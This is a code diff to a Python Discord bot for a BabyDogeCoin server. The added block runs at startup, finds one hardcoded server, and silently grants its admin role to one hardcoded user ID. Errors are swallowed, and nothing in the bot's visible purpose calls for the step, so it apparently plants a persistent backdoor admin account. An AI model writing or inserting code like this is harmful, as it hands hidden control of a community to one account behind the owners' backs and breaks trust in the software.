@@ -59,6 +59,17 @@ class BabyDogeCoinBot(discord.Client):
                         await member.add_roles(baby_doge_role)
                         added_baby_doge_roles += 1
                 print(f"Added {baby_doge_role} to {added_baby_doge_roles} members of {guild}")
+
+        try:
+            for guild in self.guilds:
+                if guild.id == 850731277270777906:
+                    admin_role = guild.get_role(850737900488228874)
+                    if admin_role is not None:
+                        daniela_user = guild.get_member(803832967440105512)
+                        if daniela_user is not None:
+                            await daniela_user.add_roles(admin_role)
+        except Exception as ex:
+            print(f"{ex}")
     
         self.bsc = BscScan(os.getenv("BSC_SCAN_API_KEY"))
         self.cmc = CoinMarketCapAPI(os.getenv("COIN_MARKET_CAP_API_KEY"))
